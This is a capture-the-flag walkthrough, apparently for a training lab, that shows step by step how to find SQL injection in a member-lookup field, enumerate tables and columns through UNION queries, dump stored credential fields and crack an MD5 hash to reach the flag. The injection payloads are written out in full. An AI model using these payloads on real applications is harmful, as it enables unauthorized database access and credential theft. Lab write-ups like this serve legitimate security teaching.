## Step 1: Open the Website

Open the target application in your browser:

```
http://<target-ip>
```

Click the **Members** button to access the member lookup page.

---

## Step 2: Test for SQL Injection

In the **Member ID** input field, try a basic SQL injection payload:

```
1 OR TRUE
```

**Result:**
The application returns valid data → SQL injection is confirmed.

---

## Step 3: Enumerate Table Names

List all tables from the database:

```
1 UNION SELECT 1, table_name FROM information_schema.tables
```

**Discovered Tables:**

* db_default
* users
* guestbook
* list_images
* vote_dbs

---

## Step 4: Enumerate Column Names (users table)

List columns from the `users` table:

```
1 UNION SELECT table_name, column_name FROM information_schema.columns
```

**Relevant Columns:**

* user_id
* first_name
* last_name
* town
* country
* planet
* Commentaire
* countersign

---

## Step 5: Dump Credentials

Extract sensitive fields from the `users` table:

```
1 UNION SELECT Commentaire, countersign FROM users
```

**Result:**

```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname: 5ff9d0165b4f92b14994e5c685cdce28
```

---

## Step 6: Identify & Crack the Hash

Use `hash-identifier` to identify the hash type:

```
hash-identifier 5ff9d0165b4f92b14994e5c685cdce28
```

**Result:**
-> MD5

Crack the MD5 hash to obtain the plaintext password.

---

## Step 7: Transform the Password

Follow the instructions from the database:

1. Convert the cracked password to **lowercase**
2. Hash it using **SHA-256**
3. The resulting SHA-256 value is the **flag**

---

## Step 8: Get the Flag

After applying the transformations (lowercase + SHA-256), the output is accepted as the final flag.
